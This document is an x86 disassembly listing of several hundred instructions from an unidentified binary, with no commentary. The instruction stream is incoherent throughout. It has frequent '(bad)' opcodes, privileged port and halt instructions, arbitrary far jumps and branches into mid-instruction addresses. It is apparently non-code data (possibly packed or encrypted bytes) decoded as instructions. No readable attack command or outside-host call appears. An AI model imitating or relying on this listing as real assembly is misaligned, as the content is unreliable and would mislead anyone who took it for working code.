  4117f9:	cdq    
  4117fa:	cdq    
  4117fb:	xchg   ebx,eax
  4117fc:	add    esp,DWORD PTR [edi+0x19f13b86]
  411802:	lahf   
  411803:	push   ebp
  411804:	(bad)  
  411805:	lods   eax,DWORD PTR ds:[esi]
  411806:	int3   
  411807:	jg     0x4117df
  411809:	cmp    al,0xb8
  41180b:	test   BYTE PTR [ecx+0x12354624],cl
  411811:	pop    edi
  411812:	inc    edx
  411813:	fbld   TBYTE PTR [edi-0x740d7f63]
  411819:	iret   
  41181a:	mov    bl,BYTE PTR [ecx-0x4b4b18de]
  411820:	xor    BYTE PTR [eax],bl
  411822:	outs   dx,BYTE PTR ds:[esi]
  411823:	mov    al,0xd8
  411825:	in     eax,dx
  411826:	mov    eax,0x8f332785
  41182b:	fucomip st,st(6)
  41182d:	repz or BYTE PTR [ecx+eax*1-0x2d],ch
  411832:	div    DWORD PTR [esi-0x2c]
  411835:	js     0x411809
  411837:	and    al,BYTE PTR [edi+0x46189e92]
  41183d:	pop    ss
  41183e:	adc    al,0x86
  411840:	hlt    
  411841:	lods   al,BYTE PTR ds:[esi]
  411842:	loopne 0x4118c0
  411844:	jb     0x41188e
  411846:	dec    edx
  411847:	lahf   
  411848:	mov    cl,0x4c
  41184a:	pop    ecx
  41184b:	adc    ah,cl
  41184d:	adc    bl,BYTE PTR [eax+esi*4+0x7]
  411851:	mov    WORD PTR [ebp+0x72600a9a],?
  411857:	cdq    
  411858:	cdq    
  411859:	fsubr  DWORD PTR [ecx]
  41185b:	pop    esi
  41185c:	mov    cl,0x6e
  41185e:	ds push ebx
  411860:	mov    ds:0xaf09dbc1,eax
  411865:	icebp  
  411866:	xchg   ebp,eax
  411867:	cmp    ah,bl
  411869:	cli    
  41186a:	sbb    eax,0x40d1aa5
  41186f:	dec    esp
  411870:	jl     0x41185a
  411872:	mov    BYTE PTR [ecx+0x408dd43f],al
  411878:	ret    0xc073
  41187b:	cmp    eax,0x6bda5456
  411880:	cwde   
  411881:	fisubr WORD PTR [esi-0xcb7a48f]
  411887:	popa   
  411888:	cs push eax
  41188a:	ss ret 0x6985
  41188e:	push   ds
  41188f:	cmp    DWORD PTR [ecx+0x33],0x4f46539e
  411896:	adc    eax,0xd9e377d2
  41189b:	mov    dl,BYTE PTR [edx-0x17]
  41189e:	add    eax,0x67d9e7e3
  4118a3:	and    DWORD PTR [edi-0x3c7c4c0c],ebx
  4118a9:	push   ebx
  4118aa:	lods   al,BYTE PTR ds:[esi]
  4118ab:	cli    
  4118ac:	sub    al,0x18
  4118ae:	aas    
  4118af:	daa    
  4118b0:	fucomip st,st(1)
  4118b2:	xchg   edx,eax
  4118b3:	icebp  
  4118b4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4118b5:	sbb    ecx,ecx
  4118b7:	xor    esi,edi
  4118b9:	stos   DWORD PTR es:[edi],eax
  4118ba:	ret    
  4118bb:	cmp    BYTE PTR [ecx+eiz*4],ah
  4118be:	dec    ebx
  4118bf:	sahf   
  4118c0:	mov    WORD PTR [ebx-0x41bd843d],ss
  4118c6:	xchg   BYTE PTR [esp+esi*4-0x3],bl
  4118ca:	(bad)  
  4118cb:	cmp    eax,0xb13ecd81
  4118d0:	xor    DWORD PTR [ecx-0x5c],0x79
  4118d4:	fimul  DWORD PTR [edx-0x77bff742]
  4118da:	xchg   esp,eax
  4118db:	out    dx,al
  4118dc:	stos   BYTE PTR es:[edi],al
  4118dd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4118df:	lds    edx,FWORD PTR [esp+esi*8+0x570becc2]
  4118e6:	jp     0x4118d7
  4118e8:	data16 int 0x5d
  4118eb:	sub    dh,bh
  4118ed:	mov    ch,0x88
  4118ef:	nop
  4118f0:	ds xchg esp,eax
  4118f2:	mov    edx,0x339a4242
  4118f7:	leave  
  4118f8:	mov    edx,0x6fcffd45
  4118fd:	jmp    0x4118ba
  4118ff:	xor    DWORD PTR [edx+ebx*4-0x6296632],ecx
  411906:	or     ebp,DWORD PTR ds:0x71e9fc3a
  41190c:	add    ecx,DWORD PTR [edi]
  41190e:	sar    DWORD PTR [ecx+0x2a],0xb1
  411912:	adc    ch,dl
  411914:	es pop es
  411916:	je     0x41197a
  411918:	popf   
  411919:	dec    edx
  41191a:	jge    0x411983
  41191c:	clc    
  41191d:	dec    ebp
  41191e:	stc    
  41191f:	in     al,0x8e
  411921:	mov    ch,BYTE PTR [ebx-0x1c]
  411924:	mov    edx,0xb7db8d9d
  411929:	add    al,BYTE PTR [edx-0x11]
  41192c:	mov    eax,DWORD PTR [edx-0x1ce8b79]
  411932:	jne    0x41198d
  411934:	xchg   DWORD PTR [esi],edi
  411936:	mov    eax,0xcd78f052
  41193b:	xchg   edx,eax
  41193c:	mov    ch,0xd3
  41193e:	std    
  41193f:	xchg   ebx,eax
  411940:	pop    ecx
  411941:	fdivp  st(0),st
  411943:	sbb    cl,ah
  411945:	or     BYTE PTR [esi+0x3159c17d],al
  41194b:	push   ds
  41194c:	aam    0x5e
  41194e:	retf   
  41194f:	call   DWORD PTR [edi+0x30]
  411952:	cmp    BYTE PTR [eax-0x7a],bl
  411955:	stos   BYTE PTR es:[edi],al
  411956:	jmp    0x5267:0x7d014bfd
  41195d:	push   0x6f
  41195f:	and    al,0xcb
  411961:	test   al,0x12
  411963:	pushf  
  411964:	jg     0x411964
  411966:	or     eax,0xbd7b0145
  41196b:	mov    dl,0x61
  41196d:	pusha  
  41196e:	iretw  
  411970:	inc    ebp
  411971:	pop    ecx
  411972:	xchg   esi,eax
  411973:	xchg   ecx,eax
  411974:	hlt    
  411975:	jge    0x4119c0
  411977:	inc    ebx
  411978:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411979:	jns    0x4119cf
  41197b:	scas   eax,DWORD PTR es:[edi]
  41197c:	xchg   ebx,eax
  41197d:	and    esp,edi
  41197f:	loope  0x411954
  411981:	xchg   ebp,eax
  411982:	pushf  
  411983:	xchg   ecx,eax
  411984:	mov    ebx,0x65089d4a
  411989:	add    ebp,DWORD PTR [edi]
  41198b:	sbb    ah,ch
  41198d:	add    al,0x42
  41198f:	mov    al,ds:0x9d26c13b
  411994:	mov    dh,BYTE PTR [ebx+eiz*8-0x64442bbc]
  41199b:	scas   eax,DWORD PTR es:[edi]
  41199c:	sub    DWORD PTR [ebp-0x4a],ebp
  41199f:	push   0xffffffeb
  4119a1:	xor    DWORD PTR [edi+eiz*8],eax
  4119a4:	std    
  4119a5:	les    ebp,FWORD PTR [esi+0x73]
  4119a8:	stc    
  4119a9:	adc    DWORD PTR [ecx-0x26],0x53
  4119ad:	xor    dh,BYTE PTR [edi]
  4119af:	(bad)  
  4119b0:	push   ds
  4119b1:	or     al,0x68
  4119b3:	clc    
  4119b4:	int    0xa5
  4119b6:	sbb    ecx,DWORD PTR [ecx+0x5e15887d]
  4119bc:	sbb    BYTE PTR [ebx],al
  4119be:	and    ah,BYTE PTR [esi+0x29d8b9b1]
  4119c4:	sub    bh,ch
  4119c6:	outs   dx,BYTE PTR ds:[esi]
  4119c7:	or     al,0x26
  4119c9:	ins    BYTE PTR es:[edi],dx
  4119ca:	xchg   esp,eax
  4119cb:	mov    edx,0x8fa03bcb
  4119d0:	dec    edi
  4119d1:	nop    DWORD PTR [eax+ebx*1+0x2a6e4c9c]
  4119d9:	(bad)  
  4119da:	fiadd  WORD PTR [edx+0x6d069cc7]
  4119e0:	and    BYTE PTR [esp+edi*8],dl
  4119e3:	test   DWORD PTR [eax-0xb],edi
  4119e6:	jno    0x4119ea
  4119e8:	dec    ebp
  4119e9:	adc    esi,DWORD PTR [eax+0xd]
  4119ec:	fldenv [ebx+0x2e]
  4119ef:	pop    ebp
  4119f0:	dec    ebp
  4119f1:	rol    DWORD PTR ds:0x18ae21f7,1
  4119f7:	(bad)  [edx-0x4c5f7be1]
  4119fd:	mov    edx,0x8e077e02
  411a02:	(bad)  
  411a03:	pop    ebp
  411a04:	or     BYTE PTR [ebp-0x7d],dl
  411a07:	jmp    0x5556:0x5c16e9ec
  411a0e:	into   
  411a0f:	jnp    0x4119bc
  411a11:	or     eax,0x6edbb519
  411a16:	icebp  
  411a17:	push   eax
  411a18:	xchg   edi,eax
  411a19:	jns    0x4119ec
  411a1b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411a1c:	xchg   edx,eax
  411a1d:	inc    edi
  411a1e:	leave  
  411a1f:	ss call 0x52108d2a
  411a25:	jno    0x4119d3
  411a27:	xchg   edi,eax
  411a28:	bound  esi,QWORD PTR [ebp+0x68b316bb]
  411a2e:	inc    ebx
  411a2f:	lock xlat BYTE PTR ds:[ebx]
  411a31:	mov    al,ds:0xf3a8445c
  411a36:	es mov ebp,0x3ba20bba
  411a3c:	out    dx,eax
  411a3d:	cmp    dl,BYTE PTR [ebx+0x38]
  411a40:	pop    ds
  411a41:	into   
  411a42:	jmp    0x9a4c:0xe428c6fe
  411a49:	fisttp DWORD PTR [edx-0x4b]
  411a4c:	adc    esi,DWORD PTR [ecx+0x25f380a7]
  411a52:	ja     0x411a60
  411a54:	or     BYTE PTR [ecx+0x22],ah
  411a57:	call   0x80c22fd7
  411a5c:	add    al,0x4f
  411a5e:	test   DWORD PTR [eax],edi
  411a60:	xor    al,0xc2
  411a62:	dec    eax
  411a63:	daa    
  411a64:	sti    
  411a65:	aaa    
  411a66:	mov    BYTE PTR [esi-0x3193276b],0x5e
  411a6d:	xchg   BYTE PTR [esi+0x38b53fa7],ah
  411a73:	(bad)  
  411a74:	mov    bh,dh
  411a76:	dec    DWORD PTR [esi+edx*1+0x51]
  411a7a:	jge    0x411a1e
  411a7c:	inc    ecx
  411a7d:	pop    ebx
  411a7e:	sbb    esi,DWORD PTR [ebx]
  411a80:	ss inc edi
  411a82:	sub    eax,0xe46dccc8
  411a87:	mov    esi,0xc8734683
  411a8c:	inc    ebx
  411a8d:	ja     0x411a29
  411a8f:	mov    ds:0x370c274,al
  411a94:	jl     0x411abd
  411a96:	in     al,dx
  411a97:	mov    ah,0x94
  411a99:	jb     0x411a80
  411a9b:	test   al,0x4e
  411a9d:	fstp   QWORD PTR [edx]
  411a9f:	loop   0x411ad2
  411aa1:	jns    0x411a83
  411aa3:	in     al,dx
  411aa4:	add    DWORD PTR [ecx],eax
  411aa6:	jmp    0x411b06
  411aa8:	aad    0x56
  411aaa:	dec    ecx
  411aab:	mov    ds:0xe9d7bae1,al
  411ab0:	jmp    0xa5555344
  411ab5:	xor    ah,BYTE PTR [esi+0x2c27c5c4]
  411abb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411abc:	out    0xd0,al
  411abe:	dec    edi
  411abf:	xor    eax,0x528cdc17
  411ac4:	sbb    ch,BYTE PTR [esi-0x57ee6afb]
  411aca:	push   ss
  411acb:	leave  
  411acc:	mov    eax,ds:0xd8b6e78f
  411ad1:	(bad)  
  411ad2:	nop
  411ad3:	loopne 0x411a8e
  411ad5:	pop    ecx
  411ad6:	mov    cs,WORD PTR [ebx-0x4e]
  411ad9:	leave  
  411ada:	test   DWORD PTR [esi-0x64d7e2d9],ecx
  411ae0:	cmp    bl,dl
  411ae2:	pop    esp
  411ae3:	jle    0x411a79
  411ae5:	push   es
  411ae6:	and    al,0xef
  411ae8:	mov    ah,0x46
  411aea:	or     eax,ebx
  411aec:	les    ebx,FWORD PTR [edi+0x3170e9a8]
  411af2:	or     al,0x3e
  411af4:	or     dh,BYTE PTR [edi+esi*4-0x33]
  411af8:	das    
  411af9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411afa:	add    DWORD PTR [ecx-0x2e],ebx
  411afd:	sbb    ebp,esi
  411aff:	add    BYTE PTR [edi],bl
  411b01:	imul   edx,ebp,0xffffffd0
  411b04:	ficom  DWORD PTR [eax]
  411b06:	jp     0x411b0e
  411b08:	loope  0x411aca
  411b0a:	rcl    BYTE PTR [edi+edx*4+0x53],0xd3
  411b0f:	sub    DWORD PTR [edi+ebp*2-0x14ba1f65],0x55b7aca8
  411b1a:	sub    eax,DWORD PTR [eax-0x26]
  411b1d:	lahf   
  411b1e:	push   edi
  411b1f:	mov    edi,DWORD PTR [esi-0x24]
  411b22:	jb     0x411b02
  411b24:	xchg   BYTE PTR [ecx+0x48],cl
  411b27:	je     0x411b6f
  411b29:	jp     0x411aed
  411b2b:	out    0x7a,eax
  411b2d:	(bad)  
  411b2e:	jecxz  0x411adc
  411b30:	ins    BYTE PTR es:[edi],dx
  411b31:	mov    eax,ds:0xd606c68
  411b36:	sahf   
  411b37:	int    0xaa
  411b39:	lods   al,BYTE PTR ds:[esi]
  411b3a:	push   ecx
  411b3b:	aad    0x76
  411b3d:	loop   0x411b3e
  411b3f:	(bad)  
  411b40:	(bad)  
  411b41:	ror    DWORD PTR [edx-0x60624c37],1
  411b47:	sbb    BYTE PTR [ebx-0x4e],ah
  411b4a:	retf   0xa482
  411b4d:	mov    ds:0x3d010352,eax
  411b52:	xchg   DWORD PTR ds:0x4d231e11,esp
  411b58:	rol    DWORD PTR [ebp+0x161a068b],cl
  411b5e:	xchg   DWORD PTR [ebp+0xf0efe4],edx
  411b64:	xor    ebp,DWORD PTR [ecx+0x4b]
  411b67:	push   edi
  411b68:	out    0xcb,eax
  411b6a:	(bad)  
  411b6b:	dec    edi
  411b6c:	das    
  411b6d:	xchg   esi,eax
  411b6e:	jnp    0x411b9b
  411b70:	out    0xcc,al
  411b72:	xchg   ebp,eax
  411b73:	gs test eax,0xf0a28f2d
  411b79:	stos   DWORD PTR es:[edi],eax
  411b7a:	inc    edx
  411b7b:	ins    DWORD PTR es:[edi],dx
  411b7c:	adc    bh,BYTE PTR [ecx]
  411b7e:	mov    cl,0x64
  411b80:	fwait
  411b81:	add    eax,0x33987cda
  411b86:	or     al,0xe6
  411b88:	shl    BYTE PTR [edi+eiz*8+0x22422bbb],cl
  411b8f:	xor    ah,dh
  411b91:	push   ss
  411b92:	mov    ds:0xbfa1f4fd,al
  411b97:	dec    ebp
  411b98:	dec    esp
  411b99:	mov    ecx,0x72de56ce
  411b9e:	das    
  411b9f:	push   ecx
  411ba0:	jle    0x411b41
  411ba2:	cmp    DWORD PTR [edx],ebp
  411ba4:	retf   
  411ba5:	in     al,0xe8
  411ba7:	inc    ebx
  411ba8:	adc    DWORD PTR [ebx+0x741ae59],0xffffffcf
  411baf:	shl    esi,cl
  411bb1:	or     BYTE PTR [eax+0x11],cl
  411bb4:	nop
  411bb5:	pusha  
  411bb6:	sub    BYTE PTR ds:[ebp+0x3243475d],0xd9
  411bbe:	retf   0x6783
  411bc1:	push   ebp
  411bc2:	aam    0x5e
  411bc4:	mov    cs:0x24ac4847,al
  411bca:	and    al,BYTE PTR [ecx+esi*8-0x36bcda50]
  411bd1:	jb     0x411c4a
  411bd3:	push   esp
  411bd4:	(bad)  
  411bd5:	mov    ds:0xee4a0223,eax
  411bda:	fiadd  DWORD PTR [ebp+0x6e]
  411bdd:	cld    
  411bde:	or     ch,BYTE PTR [esi-0x164a55dc]
  411be4:	mov    dl,al
  411be6:	cs pop es
  411be8:	cli    
  411be9:	push   edx
  411bea:	sub    al,BYTE PTR [edi-0x6a7b373d]
  411bf0:	add    al,0x6c
  411bf2:	bnd call 0x451620a7
  411bf8:	mov    DWORD PTR [ecx],eax
  411bfa:	addr16 sbb al,dh
  411bfd:	repz pusha 
  411bff:	jmp    0x5d9777d0
  411c04:	ds aas 
  411c06:	mov    gs,WORD PTR es:[eax]
  411c09:	mov    ebx,0xc7d4805b
  411c0e:	ins    BYTE PTR es:[edi],dx
  411c0f:	dec    edx
  411c10:	jbe    0x411ba9
  411c12:	cdq    
  411c13:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411c14:	retf   0xc03a
  411c17:	pop    ss
  411c18:	(bad)  
  411c19:	out    dx,al
  411c1a:	pop    esp
  411c1b:	xchg   esi,eax
  411c1c:	inc    esp
  411c1d:	or     BYTE PTR es:[edi],0x8
  411c21:	xchg   ebp,eax
  411c22:	push   ebp
  411c23:	mov    eax,ds:0xe918128e
  411c28:	arpl   WORD PTR [esi-0x4dc1bf14],si
  411c2e:	mov    bh,0x5c
  411c30:	xchg   ebp,eax
  411c31:	inc    ecx
  411c32:	in     al,dx
  411c33:	aam    0x2e
  411c35:	cmp    al,0x77
  411c37:	mov    al,ds:0x4c45a7ae
  411c3c:	cli    
  411c3d:	mov    esi,0xb61c9551
  411c42:	xlat   BYTE PTR ds:[ebx]
  411c43:	stos   DWORD PTR es:[edi],eax
  411c44:	mov    ebx,DWORD PTR [edx-0x6c]
  411c47:	sbb    esp,0x9b355e21
  411c4d:	sub    BYTE PTR [edi-0x7e],dh
  411c50:	aam    0xee
  411c52:	jns    0x411c8c
  411c54:	pop    ebp
  411c55:	xor    eax,0x74f8a7bb
  411c5a:	stc    
  411c5b:	jb     0x411c5f
  411c5d:	xchg   ebx,eax
  411c5e:	mov    ds:0xcb610385,al
  411c63:	call   0xe7e58b7
  411c68:	adc    BYTE PTR [esi-0x1a],ah
  411c6b:	lea    esi,[eax+0x23b6fe12]
  411c71:	test   eax,0x20da4512
  411c76:	mov    BYTE PTR [ebx+eax*1-0x32ed219b],0x8d
  411c7e:	xchg   ecx,eax
  411c7f:	xchg   ebx,eax
  411c80:	jmp    FWORD PTR [ebp+0x687ea98]
  411c86:	or     al,0xd4
  411c88:	cmp    BYTE PTR [esi+0x4c],0x60
  411c8c:	jmp    0xc35ecfd1
  411c91:	mov    bh,0xfc
  411c93:	mov    ebp,0x2cc5355d
  411c98:	cmp    ah,ah
  411c9a:	(bad)  
  411c9b:	les    ecx,FWORD PTR [edx+eax*2-0x56]
  411c9f:	ja     0x411c3f
  411ca1:	add    ah,0x82
  411ca4:	add    edx,DWORD PTR [ecx+eax*4]
  411ca7:	or     DWORD PTR ds:0x3213c2f6,0xffffffb3
  411cae:	cmp    al,0x71
  411cb0:	or     bl,BYTE PTR [ecx-0x25198781]
  411cb6:	les    edx,FWORD PTR [edi-0x6af4f8ad]
  411cbc:	jecxz  0x411cf4
  411cbe:	mov    ch,0xf5
  411cc0:	push   0x5c4a013b
  411cc5:	popf   
  411cc6:	cmp    al,0xf5
  411cc8:	test   al,0x41
  411cca:	mov    esi,0xd8da72ae
  411ccf:	loope  0x411c5e
  411cd1:	aam    0x5a
  411cd3:	sub    esi,edx
  411cd5:	repz pop es
  411cd7:	sbb    BYTE PTR [ecx-0x6575c409],bl
  411cdd:	addr16 (bad) 
  411ce0:	(bad)  
  411ce1:	fs jns 0x411c75
  411ce4:	call   0x5939:0x1c9c2aea
  411ceb:	popa   
  411cec:	mov    al,ds:0xa567351a
  411cf1:	or     BYTE PTR [ebp-0xfea90e4],dl
  411cf7:	push   ds
  411cf8:	out    dx,eax
  411cf9:	mov    bl,0x3a
  411cfb:	mov    eax,ds:0xfff23004
  411d00:	and    ebp,DWORD PTR [edi+0x6b]
  411d03:	cmp    eax,0x867059f2
  411d08:	adc    al,0xb0
  411d0a:	dec    eax
  411d0b:	and    eax,0xc5cb5df0
  411d10:	or     bl,BYTE PTR [edi]
  411d12:	call   0x4b70279d
  411d17:	and    DWORD PTR [edi],0x70d6e182
  411d1d:	pushf  
  411d1e:	sbb    DWORD PTR ds:0xa9db9310,esp
  411d24:	jg     0x411ce7
  411d26:	inc    ebx
  411d27:	retf   0x1cd2
  411d2a:	inc    DWORD PTR [ebp+0x30ad6e3e]
  411d30:	push   ecx
  411d31:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411d32:	and    eax,0x462b51ba
  411d37:	addr16 push 0xffffffd7
  411d3a:	cmp    dh,BYTE PTR [edi+0x56d61143]
  411d40:	mov    cl,0xfa
  411d42:	sub    BYTE PTR [ebx],bh
  411d44:	dec    eax
  411d45:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411d46:	xlat   BYTE PTR ds:[ebx]
  411d47:	ds stos DWORD PTR es:[edi],eax
  411d49:	cmp    al,0x73
  411d4b:	es loop 0x411d2c
  411d4e:	(bad)  
  411d4f:	xor    eax,0xa88045a4
  411d54:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411d55:	adc    BYTE PTR [ebx-0x6d45ba6c],ah
  411d5b:	sbb    eax,0x653c0dc9
  411d60:	pop    ecx
  411d61:	ret    
  411d62:	mov    esi,0x350daf70
  411d67:	or     eax,0x2adddcd8
  411d6c:	cwde   
  411d6d:	fcomp  DWORD PTR [eax-0x715f520a]
  411d73:	rcr    BYTE PTR [esi-0x12],1
  411d76:	call   0x7fc83de5
  411d7b:	and    DWORD PTR [ecx],0xce1d9044
  411d81:	sub    BYTE PTR [edx-0x170dada4],cl
  411d87:	mov    bl,0x89
  411d89:	mov    al,ds:0xd3f27e2a
  411d8e:	das    
  411d8f:	add    eax,ecx
  411d91:	jle    0x411dd3
  411d93:	and    BYTE PTR [eax],cl
  411d95:	or     ebx,ebp
  411d97:	sbb    al,0x62
  411d99:	dec    esp
  411d9a:	cdq    
  411d9b:	mov    ah,BYTE PTR [ebp+0x14869f83]
  411da1:	std    
  411da2:	lods   al,BYTE PTR ds:[esi]
  411da3:	jae    0x411d8c
  411da5:	(bad)  
  411da7:	inc    BYTE PTR [ecx-0x32c0b437]
  411dad:	mov    ah,0xba
  411daf:	aas    
  411db0:	pop    edi
  411db1:	mov    edx,ebx
  411db3:	aas    
  411db4:	xchg   ebx,eax
  411db5:	xlat   BYTE PTR ds:[ebx]
  411db6:	adc    al,0xb3
  411db8:	adc    DWORD PTR [esi*8-0x5a52eec6],0x1b
  411dc0:	inc    eax
  411dc1:	retf   0x824a
  411dc4:	push   esi
  411dc5:	lods   eax,DWORD PTR ds:[esi]
  411dc6:	leave  
  411dc7:	mov    ah,0x65
  411dc9:	add    ecx,edi
  411dcb:	ret    
  411dcc:	daa    
  411dcd:	lock add eax,0x7df1e852
  411dd3:	cmp    DWORD PTR [ebp-0x48],ecx
  411dd6:	mov    edx,0xa47a31c7
  411ddb:	nop
  411ddc:	jle    0x411e05
  411dde:	mov    WORD PTR [ecx-0x15],cs
  411de1:	(bad)  
  411de2:	out    dx,al
  411de3:	sahf   
  411de4:	mov    WORD PTR [edx+0x2d],es
  411de7:	sub    ch,BYTE PTR [eax+0x5f]
  411dea:	add    ch,cl
  411dec:	mov    bh,BYTE PTR [edx]
  411dee:	ins    DWORD PTR es:[edi],dx
  411def:	xchg   ebx,eax
  411df0:	pop    ebx
  411df1:	mov    BYTE PTR [ebp+0x4b3622cd],cl
  411df7:	loop   0x411dd0
  411df9:	jmp    0x411dc3
  411dfb:	pop    esi
  411dfc:	mov    esp,0x57328201
  411e01:	sbb    edi,ecx
  411e03:	lea    esp,[edi+ebx*4+0x2107ff64]
  411e0a:	hlt    
  411e0b:	push   es
  411e0c:	add    eax,0xa9c10f1a
  411e11:	js     0x411dab
  411e13:	sub    DWORD PTR [esi],ecx
  411e15:	fdivr  QWORD PTR [ebp+0x3d668339]
  411e1b:	(bad)  
  411e1c:	jns    0x411e4f
  411e1e:	cmp    dh,bl
  411e20:	int3   
  411e21:	test   ebp,0xe2db45ba
  411e27:	and    al,0xf
  411e29:	xlat   BYTE PTR ds:[ebx]
  411e2a:	aaa    
  411e2b:	adc    esp,esi
  411e2d:	inc    eax
  411e2e:	arpl   WORD PTR [edi],dx
  411e30:	mov    ecx,0xfcf49967
  411e35:	push   ds
  411e36:	adc    al,0xc9
  411e38:	fs push 0x937c276
  411e3e:	ja     0x411e90
  411e40:	cdq    
  411e41:	xor    eax,0x6e33d9b8
  411e46:	(bad)  
  411e47:	in     eax,0x8a
  411e49:	sbb    eax,0xf198ec11
  411e4e:	je     0x411e06
  411e50:	fs cwde 
  411e52:	pop    es
  411e53:	xor    esp,eax
  411e55:	adc    esi,DWORD PTR [edx-0x79]
  411e58:	(bad)  
  411e5a:	outs   dx,DWORD PTR ds:[esi]
  411e5b:	adc    BYTE PTR [esi+0x6910d11f],0x7d
  411e62:	stc    
  411e63:	dec    ebx
  411e64:	in     al,0xd1
  411e66:	aas    
  411e67:	pushf  
  411e68:	nop
  411e69:	inc    esp
  411e6a:	pop    ebp
  411e6b:	add    dh,ah
  411e6d:	and    BYTE PTR [esi],bl
  411e6f:	bound  eax,QWORD PTR [ecx]
  411e71:	(bad)  
  411e72:	jne    0x411e07
  411e74:	daa    
  411e75:	cwde   
  411e76:	cmps   DWORD PTR ss:[esi],DWORD PTR es:[edi]
  411e78:	stos   BYTE PTR es:[edi],al
  411e79:	int3   
  411e7a:	jmp    0x411e4f
  411e7c:	and    ch,dh
  411e7e:	inc    edx
  411e7f:	sbb    eax,0x5ddec8b0
  411e84:	xchg   BYTE PTR [esi-0x16],al
  411e87:	xor    al,BYTE PTR [edi+0x1248939b]
  411e8d:	dec    esi
  411e8e:	stos   DWORD PTR es:[edi],eax
  411e8f:	cmp    eax,DWORD PTR [edi]
  411e91:	xchg   esp,eax
  411e92:	(bad)  
  411e93:	aam    0xa4
  411e95:	(bad)  
  411e98:	add    eax,0x3508dc22
  411e9d:	test   BYTE PTR [edi+0x7b213238],ch
  411ea3:	mov    ch,0xbc
  411ea5:	xor    ch,BYTE PTR [edx+0xeece344]
  411eab:	pop    eax
  411eac:	jl     0x411eb1
  411eae:	and    eax,0xa4e3e77a
  411eb3:	push   ebx
  411eb4:	xor    eax,0x7d612f0a
  411eb9:	or     DWORD PTR [eax],ebx
  411ebb:	enter  0xc3da,0x79
  411ebf:	dec    esi
  411ec0:	mov    esp,DWORD PTR [edi-0x6d]
  411ec3:	adc    bl,BYTE PTR [esi-0x34ea9d06]
  411ec9:	xor    eax,edx
  411ecb:	push   esi
  411ecc:	rcl    BYTE PTR ds:0x6141ff34,0xc3
  411ed3:	mov    ch,0xf0
  411ed5:	sbb    BYTE PTR [esi],dh
  411ed7:	pusha  
  411ed8:	add    bh,bh
  411eda:	xchg   ecx,eax
  411edb:	inc    esp
  411edc:	out    dx,al
  411edd:	dec    eax
  411ede:	mov    eax,0xc76c531a
  411ee3:	pop    ebx
  411ee4:	xchg   esp,eax
  411ee5:	jns    0x411eff
  411ee7:	mov    dl,0xa0
  411ee9:	xchg   esi,eax
  411eea:	sbb    BYTE PTR [esi-0x383],bl
  411ef0:	fdivr  QWORD PTR [esi+0x7f626eb]
  411ef6:	out    dx,al
  411ef7:	test   DWORD PTR [edx+0x6372a244],0x2767c166
  411f01:	ret    
  411f02:	ds mov al,0xb8
  411f05:	cwde   
  411f06:	mov    esi,eax
  411f08:	mov    DWORD PTR [esi],ebp
  411f0a:	int3   
  411f0b:	and    ah,BYTE PTR [ebx+0x7]
  411f0e:	push   esi
  411f0f:	jns    0x411f51
  411f11:	mov    esi,DWORD PTR [ecx]
  411f13:	data16 movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411f15:	push   es
  411f16:	scas   eax,DWORD PTR es:[edi]
  411f17:	int3   
  411f18:	pop    eax
  411f19:	sti    
  411f1a:	jmp    0xf3c8:0xb8d8788b
  411f21:	test   DWORD PTR [eax+0x5f],ebp
  411f24:	xor    al,0x79
  411f26:	ret    
  411f27:	ja     0x411f7b
  411f29:	xchg   edx,eax
  411f2a:	add    eax,0xcbe08cfd
  411f2f:	pop    eax
  411f30:	stc    
  411f31:	jg     0x411f3c
  411f33:	in     al,dx
  411f34:	std    
  411f35:	into   
  411f36:	icebp  
  411f37:	xor    al,BYTE PTR [ecx+0x33]
  411f3a:	jecxz  0x411f9f
  411f3c:	inc    edi
  411f3d:	test   al,0xdd
  411f3f:	jbe    0x411f56
  411f41:	cli    
  411f42:	lea    edi,[esi-0x659a2194]
  411f48:	mov    edx,0x833e918f
  411f4d:	sub    bh,bl
  411f4f:	sub    esp,DWORD PTR [esi]
  411f51:	cmp    ecx,edx
  411f53:	dec    ecx
  411f55:	sbb    al,BYTE PTR [ebx+eax*2]
  411f58:	cmp    bx,WORD PTR [ecx+0x3c9e6cc0]
  411f5f:	test   BYTE PTR [ecx],dh
  411f61:	mov    edi,0x3069fcc0
  411f66:	adc    bl,bh
  411f68:	xor    ecx,DWORD PTR [eax]
  411f6a:	jmp    0xfb07:0xe2112443
  411f71:	cmp    eax,0x381cc778
  411f76:	ins    DWORD PTR es:[edi],dx
  411f77:	stos   BYTE PTR es:[edi],al
  411f78:	inc    edi
  411f79:	adc    BYTE PTR [ebx],0xeb
  411f7c:	retf   0x8d9c
  411f7f:	popa   
  411f80:	sub    al,0x9b
  411f82:	xchg   ecx,eax
  411f83:	imul   ebx,DWORD PTR [esi+0x72ca9f1e],0xa2f3e8a2
  411f8d:	neg    DWORD PTR [esi+ebp*1-0x4de61ae5]
  411f94:	add    DWORD PTR [edx],0xb3e72845
  411f9a:	stos   DWORD PTR es:[edi],eax
  411f9b:	sub    DWORD PTR [edx],0xc5b0ea01
  411fa1:	mov    edx,0xa502d87f
  411fa6:	les    edi,FWORD PTR [edx+0x3177ffa0]
  411fac:	inc    edi
  411fad:	sub    eax,0xdce0a039
  411fb2:	add    al,0x65
  411fb4:	sub    BYTE PTR [ecx-0x73a091fa],0x34
  411fbb:	cmp    eax,0xfdcdd64c
  411fc0:	mov    edx,0x5a61afa2
  411fc5:	(bad)  
  411fc6:	mov    dl,0xee
  411fc8:	xchg   dh,bl
  411fca:	push   ebx
  411fcb:	jbe    0x411fc1
  411fcd:	addr16 mov ch,0xfe
  411fd0:	jo     0x411f6a
  411fd2:	push   ecx
  411fd3:	and    al,0x98
  411fd5:	mov    BYTE PTR [ecx],cl
  411fd7:	(bad)  
  411fd8:	stos   BYTE PTR es:[edi],al
  411fd9:	in     al,0xd4
  411fdb:	jl     0x411f95
  411fdd:	mov    WORD PTR [edx-0x607a9232],es
  411fe3:	push   ebp
